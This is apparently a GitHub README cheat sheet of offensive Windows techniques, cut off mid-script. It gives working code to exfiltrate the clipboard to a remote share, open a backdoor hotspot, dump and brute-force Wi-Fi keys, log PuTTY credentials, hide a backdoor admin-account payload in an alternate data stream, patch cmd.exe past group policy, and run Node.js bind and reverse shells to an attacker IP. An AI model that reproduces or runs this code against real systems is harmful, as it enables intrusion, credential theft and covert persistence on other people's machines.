# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  These are uncommon exploits that are not often used.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage()))
{
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.192.103.49\smbdata\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
}
else
{
   if($([System.Windows.Forms.Clipboard]::ContainsText()))
   {
      $cb = [System.Windows.Forms.Clipboard]::GetText()
      $file = '\\10.192.103.49\smbdata\clipboard.txt'
      $cb > $file
   }
   else
   {
      Write-Output "Nothing in clipboard to save."
   }
}
```

## >> Configuring a backdoor hotspot using powershell

**Activation script** `wifi-start.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll
sc start SharedAccess | Out-Null

$ssid = "BACKDOOR"
$wpsk = "1234567890"

$hsup = netsh wlan show drivers | Select-String "Hosted network supported" | Select-String "Yes"
if(!$hsup)
{
   Write-Host "Wireless host mode not supported."
   Exit
}
$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String ": Started"
if($huse)
{
   Write-Host "Wireless host mode already in use."
   Exit
}
$wuse = netsh wlan show interfaces | Select-String "State" | Select-String "disconnected"
if(!$wuse)
{
   Write-Host "Wireless interface already in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq 'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$hcfg = netsh wlan set hostednetwork mode=allow ssid="$ssid" key="$wpsk" | Select-String "successfully changed"
if(!$hcfg)
{
   Write-Host "Wireless host mode could not be configured."
   Exit
}
$hact = netsh wlan start hostednetwork | Select-String "hosted network started"
if(!$hact)
{
   Write-Host "Wireless host mode could not be activated."
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
if($cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS ethernet interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$cfgpri.EnableSharing(1)
$cfgpub.EnableSharing(0)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot configured successfully."
   Exit
}
else
{
   Write-Host "ICS wireless hotspot setup failed."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
```

If you get error `Exception from HRESULT: 0x80040201` from the `EnableSharing` method then run the following VB script to delete all interface ICS configurations and try the `wifi-start.ps1` script again.<br />
```
set WMI = GetObject("WinMgmts:\root\Microsoft\HomeNet")
set objs1 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPrivate = TRUE")
for each obj in objs1
   obj.IsIcsPrivate = FALSE
   obj.Put_
next
set objs2 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPublic = TRUE")
for each obj in objs2
   obj.IsIcsPublic = FALSE
   obj.Put_
next
```

**Deactivation script** `wifi-stop.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"

$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if(!$huse)
{
   Write-Host "Wireless host mode not in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot deactivated."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
else
{
   Write-Host "Active ICS hotspot not detected."
   Exit
}
```

## >> Retrieving wireless profile passwords using powershell

```powershell
$wp = @()
(((netsh wlan show profiles) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*All user profile*')
   {
      $t = $_.Split(":")
      $wp += $t[1].trim()
   }
})
Write-Host "SSID -> PSK"
Write-Host "-----------------------------------------"
$wp.foreach({
   $id = $_
   (((netsh wlan show profile "$id" key=clear) | Out-String).Split("`r`n")).ForEach({
   if($_ -Like '*Key content*')
   {
      $pw = ($_.Split(":"))[1].trim()
      Write-Host "$id -> $pw"
   }
})})
```

## >> View wireless networks and signal strength using netsh

```netsh wlan show networks mode=bssid```

## >> Slow on-line brute-force wireless password using powershell

```powershell
$ssid = "iPhone"
$wordlist = @("password",
              "secretkey!",
              "wifiaccess",
              "wifipassword",
              "1234567890",
              "Pa55w0rd")
$xmlfile = "C:\windows\temp\BruteForce.xml"
$pxml = @'
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
   <name>BruteForce</name>
   <SSIDConfig>
      <SSID>
         <hex>------</hex>
         <name>------</name>
      </SSID>
   </SSIDConfig>
   <connectionType>ESS</connectionType>
   <connectionMode>auto</connectionMode>
   <MSM>
      <security>
         <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
         </authEncryption>
         <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>------</keyMaterial>
         </sharedKey>
      </security>
   </MSM>
</WLANProfile>
'@
$ssidhex = ""
$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*Name*')
   {
      $t = $_.Split(":")
      $wlan = $t[1].trim()
   }
})
if($wlan -eq $null)
{
   Write-Host "Could not identify the wireless adapter."
   Exit
}
foreach($key in $wordlist)
{
   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
   ForEach($line in $($pxml -split "`r`n"))
   {
      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
      $line | Out-File "$xmlfile"
   }
   netsh wlan add profile filename="$xmlfile" | Out-Null
   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
   Start-Sleep -s 4
   $state = ""
   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
      if($_ -Like '*State*')
      {
         $t = $_.Split(":")
         $state = $t[1].trim()
      }
   })
   if($state -eq "connected")
   {
      Write-Host "Wireless PSK -> $key"
      netsh wlan delete profile name="BruteForce" | Out-Null
      Exit
   }
   netsh wlan delete profile name="BruteForce" | Out-Null
}
```

## >> Logging PuTTY credentials using powershell

```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "C:\Windows\Temp\puttylog$snum.log" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 3 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 0 -Type DWord -Force | Out-Null
   <# to remove logging
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 1 -Type DWord -Force | Out-Null
   #>
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) were configured to log credentials."
}
else
{
   Write-Host "There were no PuTTY sessions to configure."
}
```

**Listing PuTTY log paths**<br />
```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   $ppath = Get-ItemProperty -Path "$rkey" -Name "LogFileName"
   if($ppath)
   {
      $ppath.LogFileName
   }
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) have a log path."
}
else
{
   Write-Host "No PuTTY logging identified."
}
```

## >> Hiding payloads in Alternate Data Streams (ADS)

**Create a container file on an NTFS file system**<br />
`echo This is a harmless text file :) > c:\windows\temp\harmless.txt`

**Verify the contents of the container file**<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Check the file size of the container file**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`

**Create powershell payload as base64 to add a backdoor account**<br />
Run `cat | base64 -w 0; echo` then paste the following code, press ctrl-d (EOF) when finished.<br />
```powershell
$Password = ConvertTo-SecureString "+BackD00rAdmin+" -AsPlainText -Force
New-LocalUser -Name "BDAdmin" -Password $Password -AccountNeverExpires -FullName "BD Admin" -Description "Helpdesk account, do not delete" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
```

**Create the hidden payload data stream using the base64 output above**<br />
`echo JFBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiK0JhY2tEMDByQWRtaW4rIiAtQXNQbGFpblRleHQgLUZvcmNlCk5ldy1Mb2NhbFVzZXIgLU5hbWUgIkJEQWRtaW4iIC1QYXNzd29yZCAkUGFzc3dvcmQgLUFjY291bnROZXZlckV4cGlyZXMgLUZ1bGxOYW1lICJCRCBBZG1pbiIgLURlc2NyaXB0aW9uICJIZWxwZGVzayBhY2NvdW50LCBkbyBub3QgZGVsZXRlIiAtUGFzc3dvcmROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAiQkRBZG1pbiIK > c:\windows\temp\harmless.txt:payload.ps1`

**Verify the size and contents of** `harmless.txt` **have not changed**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Detonate the hidden payload to create the backdoor account**<br />
```powershell
powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
```

## >> TCP port scanning using certutil

This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
The target being scanned in this example is 10.1.2.3 port 8080.

`certutil -urlcache -split -f http://10.1.2.3:8080/doesnotexist.file doesnotexist.file | findstr FAILED`<br />
Response `0x80072f78` the port responded but is not HTTP protocol.<br />
Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not present (404 error).<br />
Response `0x80072efd` the port did not respond.<br />
Response does not contain an error code, then the file was retrieved successfully.

## >> TCP port scanning using powershell

```powershell
$TcpPorts = 21,22,23,25,80,81,110,111,135,139,143,389,443,445,465,513,514,515,587,636,993,995,1080,1433,3128,3306,3389,4786,5800,5900,8080,8081,8088,8443,8888,10000
$IpAddress = "192.168.1.19"
$MsTimeout = 100

foreach($Port in $TcpPorts)
{
   $Socket = New-Object Net.Sockets.TcpClient
   $Socket.SendTimeout = 100
   $ErrorActionPreference = 'SilentlyContinue'
   $AsyncResult = $Socket.BeginConnect($IpAddress, $Port, $null, $null)
   Start-Sleep -milli $MsTimeout
   if($Socket.Connected)
   {
      Write-Output "$IpAddress port $Port is open"
   }
   else
   {
       # handle closed status here
   }
   $Socket.Close()
   $Socket = $null
}
```

## >> Using netsh to capture network packets

This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.

**Stop any currently running captures**<br />
`netsh trace stop`

**Start the packet capture**<br />
`netsh trace start capture=yes ipv4.address=10.2.5.92 filemode=single maxsize=10 overwrite=yes tracefile=c:\Windows\temp\tracefile.etl`

**Convert the etl file to cap format for wireshark**<br />
Download Microsoft Network Monitor 3.4 from [HERE](https://www.microsoft.com/en-us/download/details.aspx?id=4865).<br />
Open `tracefile.etl` with Network Monitor 3.4 and save as `tracefile.cap`.<br />
Open `tracefile.cap` using wireshark.

## >> Performing SNMP from powershell

The Windows ISNMP Automation Interface can be used to perform GET and SET operations.  Cisco 3750 OID used in this example.

```powershell
# Get the system description
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.1.1.0')
$objSNMP.Close()
```

```powershell
# Get an interface description (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface VLAN assignment (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface link status (Ge2/0/24, 1 = up, 2 = down)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.8.10624')
$objSNMP.Close()
```

```powershell
# Change an interface VLAN assignment (Ge2/0/24, to VLAN 315)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Set('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624', 315)
$objSNMP.Close()
```

## >> Circumventing cmd.exe policy restrictions

Windows group policy can be configured to disable execution of the command prompt by setting an option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message being displayed when attempting to launch the command prompt.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd02.png)

The cmd.exe program tests for the following registry value to determine if this policy is set:<br />
`HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD`

The unicode string for the registry value exists in the cmd.exe binary.  You can make a copy of cmd.exe and edit this string to defeat policy checking.  Here is an example of generating the hex characters to search for.

`echo DisableCMD | iconv -t utf-16le | hexdump -Cv`<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd00.png)

Using certutil.exe you can make a copy of cmd.exe represented as a text file containing hex characters.<br />
`c:\windows\system32\certutil.exe -encodehex c:\windows\system32\cmd.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd03.png)

Now edit the text file using notepad.<br />
`c:\windows\system32\notepad.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd04.png)

Find the hex characters that make up the unicode string generated earlier.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd05.png)<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd06.png)

Edit the hex values from `44 00 69 00` to `44 00 00 00` and save the text file.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd07.png)

Convert the text file back into an exe.<br />
`c:\windows\system32\certutil.exe -decodehex c:\windows\xxxxxxxx\appdata\local\temp\cmd.txt c:\windows\xxxxxxxx\appdata\local\temp\cmd.exe`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd08.png)

Double-click on the modified copy of cmd.exe.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd09.png)

You now have a command shell.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)

## >> Node.js bind and reverse shell using node.exe

The Node.js JavaScript runtime is occasionally found on a Windows system either as a standalone installation or bundled in with some other application (e.g. Adobe Creative Cloud).  You can also extract the node.exe binary from the [ZIP package](https://nodejs.org/en/download/ "Node.js Download") and copy it to a victim computer.

Example of a bind shell (socket server)<br />
```javascript
// Example command execution with authentication.
// (1) Save this script as "server.js"
// (2) Launch the bind shell on the victim "node.exe server.js"
// (3) Connect from the attacking computer "nc <victim IP> 4444"
// command: ug0tpwn3d, allows the server to start processing commands.
// command: DISCONNECT, drops current connection, must reauth with key on new client connect.
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '0.0.0.0';
var c2port = 4444;
var state = 'DISABLED';
var authkey = 'ug0tpwn3d';

var server = net.createServer(function(socket)
{
   socket.write('Ready...\r\n');
   socket.on('data', function(directive)
   {
      if(directive.toString().trim() === authkey && state === 'DISABLED')
      {
         // authn success, start processing commands
         state = 'ENABLED';
         socket.write('Authentication successful.  Accepting commands...\r\n');
      }
      else if(directive.toString().trim() === 'DISCONNECT' && state === 'ENABLED')
      {
         // drop current connection and disable command processor
         socket.destroy();
         state = 'DISABLED';
      }
      else if(directive.toString().trim() === 'ABORT' && state === 'ENABLED')
      {
         // terminate the script
         socket.destroy();
         process.exit(1);
      }
      else if(state === 'ENABLED')
      {
         // execute a command
         cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
         cmd.stdout.on('data', function(output)
         {
            socket.write(output.toString());
         });
         cmd.stderr.on('data', function(output)
         {
            socket.write(output.toString());
         });
      }
   });
}).listen(c2port, c2host);
```

Example of a reverse shell (socket client)<br />
```javascript
// Example command execution.
// (1) Save this script as "client.js"
// (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
// (3) Launch the reverse shell on the victim "node.exe client.js"
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '192.168.1.119';
var c2port = 4444;

var client = new net.Socket();
client.connect(c2port, c2host, function()
{
   client.write('Ready...\r\n');
});
client.on('data', function(directive)
{
   if(directive.toString().trim() === 'ABORT')
   {
      // terminate the script
      client.destroy();
      process.exit(1);
   }
   else
   {
      // execute a command
      cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
      cmd.stdout.on('data', function(output)
      {
         client.write(output.toString());
      });
      cmd.stderr.on('data', function(output)
      {
         client.write(output.toString());
      });
   }
});
```

## >> TCP port forwarding with netsh

Forward TCP port 2222 to port 22 on remote host.

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=10.192.103.49`

Remove port forwarding rule.

`netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0`

## >> TCP local port forwarding with powershell

Local port forwarder using a bind socket.  Example listens on port 2222 and forwards to remote host 192.168.1.19 port 22.

```powershell
# Target parameters
$tcpRHost = "192.168.1.19"
$tcpRPort = "22"

# Bind parameters
$tcpLAddr = "0.0.0.0"
$tcpLPort = "2222"

try {
   $TcpServer = New-Object System.Net.Sockets.TcpListener([system.net.IPAddress]::Parse($tcpLAddr), $tcpLPort)
}
catch {
   Write-Output "Failed to listen on $tcpLAddr port $tcpLPort"
   exit
}

try {
   $TcpServer.Start()
}
catch {
   Write-Output "Failed to start server on $tcpLAddr port $tcpLPort"
   $tcpServer.Stop()
   exit
}

$tcpConnection = $tcpServer.AcceptTcpClient()
$RemoteIP = $tcpConnection.Client.RemoteEndPoint.Address.IPAddressToString
Write-Output "Received connection from $RemoteIP"
if($tcpConnection -ne $null)
{
   $tcpServer.Stop()
   try {
      $tcpClient = New-Object System.Net.Sockets.TcpClient($tcpRHost, $tcpRPort)
   }
   catch {
      Write-Output "Failed to connect to $tcpRHost port $tcpRPort"
      exit
   }
}
else
{
   Write-Output "Accept error"
   $tcpServer.Stop()
   exit
}

$LStream = $tcpConnection.GetStream()
$RStream = $tcpClient.GetStream()

$LBuffer = New-Object Byte[] $tcpConnection.ReceiveBufferSize
$RBuffer = New-Object Byte[] $tcpClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpConnection.Connected -and $tcpClient.Connected)
   {
      if(($tcpConnection.Client.Available -gt 0) -or ($tcpClient.Client.Available -gt 0))
      {
         if($tcpConnection.Client.Available -gt 0)
         {
            $LRead = $LStream.Read($LBuffer, 0, $LBuffer.Length)
            $RStream.Write($LBuffer, 0, $LRead)
            $idle = 0
         }
         if($tcpClient.Client.Available -gt 0)
         {
            $RRead = $RStream.Read($RBuffer, 0, $RBuffer.Length)
            $LStream.Write($RBuffer, 0, $RRead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpConnection.Close()
            $tcpClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

## >> TCP remote port forwarding with powershell

Remote port forwarder on attacking host relays through Windows host running a powershell port forwarder.  Example attacking Linux host runs a python script that proxies a local application through a connection received from the Windows host.  The Windows host then forwards the traffic to another remote host.  This example shows how to run a python script on attacking host 192.168.1.19 that forwards SSH to port 2222 through a connection initiated from a Windows host to the attacking machine on tunnel port 4444.  The Windows host then forwards the SSH traffic to remote host 192.168.100.109 port 22.

Python script `apprelay.py`<br />
```python
#!/usr/bin/python

import socket
import sys
import struct
from time import sleep
import select as socksel

t_port = 4444
a_port = 2222
t_host = '0.0.0.0'
a_host = 'localhost'

t_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

t_addr = (t_host, t_port)
a_addr = (a_host, a_port)

t_socket.bind(t_addr)
a_socket.bind(a_addr)

t_socket.listen(1)
t_conn, t_caddr = t_socket.accept()
print("Tunnel connection received from {}".format(t_caddr))
print "Start your local application and connect to " + a_host + " on port " + str(a_port)

a_socket.listen(1)
a_conn, a_caddr = a_socket.accept()
print "Application connection received"

t_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
a_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))

while True:
   sock_list = [t_conn, a_conn]
   read_sock, write_sock, error_sock = socksel.select(sock_list , sock_list, sock_list)
   t = 0
   for sock in read_sock:
       if(sock == t_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            a_conn.send(data)
         else:
